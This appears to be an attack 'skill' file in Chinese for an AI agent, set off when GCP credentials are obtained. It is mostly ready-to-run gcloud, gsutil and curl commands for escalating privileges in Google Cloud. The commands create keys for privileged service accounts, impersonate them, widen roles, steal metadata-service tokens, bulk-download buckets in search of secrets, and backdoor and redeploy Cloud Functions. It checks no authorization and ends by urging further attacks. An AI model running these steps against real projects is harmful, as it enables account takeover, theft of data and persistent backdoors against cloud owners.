---
name: gcp-attack
type: attack
category: privilege-escalation
platform: gcp
severity: high
---

# GCP 攻击技能

## 触发条件

- 获取到 GCP 凭证（service account JSON 或 access token）
- 用户要求"测试 GCP 权限"
- 发现 GCP 资源

## 前置检查

```bash
# 1. 激活服务账号
gcloud auth activate-service-account --key-file=sa_credentials.json

# 2. 验证凭证
gcloud auth list
gcloud projects list

# 3. 设置默认项目
PROJECT_ID=$(gcloud config get-value project)
```

## 攻击方法

### 方法 1: 服务账号密钥创建

```bash
# 1. 列出服务账号
gcloud iam service-accounts list

# 2. 为高权限服务账号创建密钥
gcloud iam service-accounts keys create key.json \
  --iam-account=PRIVILEGED_SA@$PROJECT_ID.iam.gserviceaccount.com

# 3. 使用新密钥
gcloud auth activate-service-account --key-file=key.json

# 4. 验证权限
gcloud compute instances list
```

### 方法 2: 服务账号模拟

```bash
# 1. 获取访问令牌
gcloud auth print-access-token \
  --impersonate-service-account=PRIVILEGED_SA@$PROJECT_ID.iam.gserviceaccount.com

# 2. 使用令牌
TOKEN=$(gcloud auth print-access-token \
  --impersonate-service-account=PRIVILEGED_SA@$PROJECT_ID.iam.gserviceaccount.com)

curl -H "Authorization: Bearer $TOKEN" \
  https://compute.googleapis.com/compute/v1/projects/$PROJECT_ID/aggregated/instances
```

### 方法 3: 角色修改

```bash
# 1. 查看当前角色
gcloud iam roles list --project=$PROJECT_ID

# 2. 修改角色添加权限
gcloud iam roles update ROLE_NAME \
  --project=$PROJECT_ID \
  --add-permissions="compute.instances.create,storage.objects.create"

# 3. 验证
gcloud iam roles describe ROLE_NAME --project=$PROJECT_ID
```

### 方法 4: 元数据服务攻击

```bash
# 1. 访问元数据服务
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/

# 2. 获取服务账号
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# 3. 获取令牌
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# 4. 使用令牌
TOKEN=$(curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token)

curl -H "Authorization: Bearer $(echo $TOKEN | jq -r '.access_token')" \
  https://storage.googleapis.com/storage/v1/b
```

### 方法 5: GCS 存储攻击

```bash
# 1. 列出存储桶
gsutil ls

# 2. 枚举存储桶内容
gsutil ls -r gs://bucket-name/

# 3. 检查权限
gsutil iam get gs://bucket-name/

# 4. 下载敏感数据
gsutil -m cp -r gs://bucket-name/* ./downloaded

# 5. 搜索敏感文件
find ./downloaded -type f \( -name "*.env" -o -name "*.key" -o -name "*.json" \)
```

### 方法 6: Cloud Functions 攻击

```bash
# 1. 列出函数
gcloud functions list

# 2. 获取函数代码
gcloud functions describe FUNCTION_NAME --region=REGION

# 3. 下载代码
gcloud functions download-code FUNCTION_NAME --region=REGION --destination=./function_code

# 4. 植入后门并重新部署
# 修改代码后
gcloud functions deploy FUNCTION_NAME \
  --region=REGION \
  --source=./function_code \
  --runtime=python39
```

## 验证成功

```bash
# 成功获取高权限
gcloud compute instances list
gcloud functions list
gsutil ls

# 成功访问资源
gsutil cat gs://bucket-name/sensitive-file.txt
```

## 输出报告

```markdown
# GCP 攻击报告
- Project ID: xxx
- 服务账号: xxx
- 获取权限: xxx
- 访问资源: xxx
```

## 下一步

1. gcp-enum - 枚举更多资源
2. 继续攻击其他服务
